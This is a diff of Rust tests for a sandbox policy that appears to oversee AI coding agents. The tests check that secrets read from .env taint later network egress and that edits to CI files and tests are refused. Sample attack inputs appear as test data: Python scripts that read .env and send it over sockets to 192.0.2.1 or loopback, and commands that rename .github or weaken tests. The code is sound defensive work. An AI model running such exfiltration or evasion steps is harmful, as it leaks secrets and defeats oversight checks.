@@ -132,10 +132,17 @@ async fn auditing_reports_a_blocked_peer_without_blocking_it() {
     accepted(&shell, &format!("cat .env > /dev/null; {}", egress("rc"))).await;
     assert_eq!(fixture.read("rc"), STARTED);
     let reported = reported.lock().unwrap().clone();
-    assert!(
+    // Reported once, at the syscall; publication does not repeat it.
+    assert_eq!(
         reported
             .iter()
-            .any(|line| line.starts_with("net/external blocked: ")),
+            .filter(|line| line.starts_with("net/external"))
+            .collect::<Vec<_>>(),
+        [&format!(
+            "net/external would block: {} contacted an external network peer after reading \
+             secret data",
+            shell.principal()
+        )],
         "{reported:?}"
     );
     close(shell).await;
@@ -275,4 +282,162 @@ int main(void) {
     accepted(&agent, "./mm").await;
     assert_eq!(fixture.read("rc"), format!("-1 {}", libc::EPERM));
     close(agent).await;
+}
+
+#[tokio::test]
+#[serial(agent_policy)]
+async fn a_refused_command_still_taints_by_what_it_read() {
+    let fixture = Fixture::new();
+    fixture.write(".env", "TOKEN=1\n");
+    fixture.write(".github/workflows/ci.yml", "on: push\n");
+    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
+    // Refused for the CI edit, but the secret was already read and printed.
+    refused(&shell, "cat .env; printf x > .github/workflows/ci.yml").await;
+    accepted(&shell, &egress("rc")).await;
+    assert_eq!(fixture.read("rc"), BLOCKED);
+    close(shell).await;
+}
+
+#[tokio::test]
+#[serial(agent_policy)]
+async fn moving_a_protected_directory_changes_its_paths() {
+    let fixture = Fixture::new();
+    fixture.write(".github/workflows/ci.yml", "on: push\n");
+    fixture.write("tests/a.rs", "old\n");
+    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
+    refused(&shell, "mv .github .gh-old").await;
+    assert!(fixture.seed.join(".github/workflows/ci.yml").exists());
+    accepted(&shell, "printf changed > src/a.txt").await;
+    refused(&shell, "mv tests .old").await;
+    assert_eq!(fixture.read("tests/a.rs"), "old\n");
+    close(shell).await;
+}
+
+#[tokio::test]
+#[serial(agent_policy)]
+async fn changing_tests_again_after_a_source_edit_in_one_command_is_refused() {
+    let fixture = Fixture::new();
+    fixture.write("tests/a.rs", "old\n");
+    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
+    refused(
+        &shell,
+        "printf a > tests/a.rs; printf b > src/b.txt; printf weakened > tests/a.rs",
+    )
+    .await;
+    assert_eq!(fixture.read("tests/a.rs"), "old\n");
+    close(shell).await;
+}
+
+#[tokio::test]
+#[serial(agent_policy)]
+async fn a_socket_connected_before_a_secret_read_cannot_send_after_it() {
+    let fixture = Fixture::new();
+    fixture.write(".env", "TOKEN=1\n");
+    let script = r#"import socket
+def attempt(send):
+    try:
+        send()
+        return "sent"
+    except PermissionError:
+        return "blocked"
+    except OSError as error:
+        return type(error).__name__
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.connect(("192.0.2.1", 9))
+before = attempt(lambda: s.send(b"x"))
+data = open(".env").read().encode()
+after = [attempt(lambda: s.send(data)), attempt(lambda: s.sendto(data, ("127.0.0.1", 9)))]
+open("rc", "w").write(" ".join([before] + after))
+"#;
+    fixture.write("x.py", script);
+    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
+    accepted(&shell, "python3 x.py").await;
+    // The second send names a loopback peer, but a connected datagram socket is judged by its
+    // connected peer too.
+    let rc = fixture.read("rc");
+    let outcomes: Vec<&str> = rc.split(' ').collect();
+    assert_ne!(outcomes[0], "blocked", "{rc}");
+    assert_eq!(&outcomes[1..], ["blocked", "blocked"], "{rc}");
+    close(shell).await;
+}
+
+#[tokio::test]
+#[serial(agent_policy)]
+async fn writes_to_a_connected_stream_are_judged_by_its_peer() {
+    let fixture = Fixture::new();
+    fixture.write(".env", "TOKEN=1\n");
+    // A loopback listener stands in for an external server: the policy forbids loopback too.
+    let script = r#"import os, socket
+server = socket.socket()
+server.bind(("127.0.0.1", 0))
+server.listen(1)
+client = socket.create_connection(server.getsockname())
+os.read(os.open(".env", os.O_RDONLY), 64)
+try:
+    os.write(client.fileno(), b"secret")
+    rc = "sent"
+except PermissionError:
+    rc = "blocked"
+open("rc", "w").write(rc)
+"#;
+    fixture.write("tcp.py", script);
+    let policy = AgentPolicy::new()
+        .class("**/.env", "secret")
+        .unwrap()
+        .rule(AgentRule::no_contact_after_read("secret", &["loopback"]));
+    let shell = fixture.agent(policy).await;
+    accepted(&shell, "python3 tcp.py").await;
+    assert_eq!(fixture.read("rc"), "blocked");
+    close(shell).await;
+}
+
+#[tokio::test]
+#[serial(agent_policy)]
+async fn one_agent_principal_carries_taint_across_its_shells() {
+    let fixture = Fixture::new();
+    fixture.write(".env", "TOKEN=1\n");
+    let policy = || AgentPolicy::recommended().unwrap().principal("agent");
+    let first = fixture.agent(policy()).await;
+    let second = fixture.agent(policy()).await;
+    accepted(&first, "cat .env > /dev/null").await;
+    accepted(&second, &egress("rc")).await;
+    assert_eq!(fixture.read("rc"), BLOCKED);
+    close(first).await;
+    close(second).await;
+}
+
+#[tokio::test]
+#[serial(agent_policy)]
+async fn netlink_is_not_egress() {
+    let fixture = Fixture::new();
+    fixture.write(".env", "TOKEN=1\n");
+    // Name resolution asks the kernel about local addresses over netlink.
+    let script = r#"import socket
+s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, socket.NETLINK_ROUTE)
+try:
+    s.sendto(b"\0" * 16, (0, 0))
+    rc = "sent"
+except PermissionError:
+    rc = "blocked"
+except OSError as error:
+    rc = type(error).__name__
+open("rc", "w").write(rc)
+"#;
+    fixture.write("nl.py", script);
+    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
+    accepted(&shell, "cat .env > /dev/null; python3 nl.py").await;
+    assert_ne!(fixture.read("rc"), "blocked");
+    close(shell).await;
+}
+
+#[tokio::test]
+#[serial(agent_policy)]
+async fn running_python_tests_after_a_source_edit_is_accepted() {
+    let fixture = Fixture::new();
+    fixture.write("tests/test_a.py", "X = 1\n");
+    let shell = fixture.agent(AgentPolicy::recommended().unwrap()).await;
+    accepted(&shell, "printf changed > src/a.txt").await;
+    accepted(&shell, "cd tests && python3 -c 'import test_a'").await;
+    assert!(fixture.seed.join("tests/__pycache__").exists());
+    close(shell).await;
 }
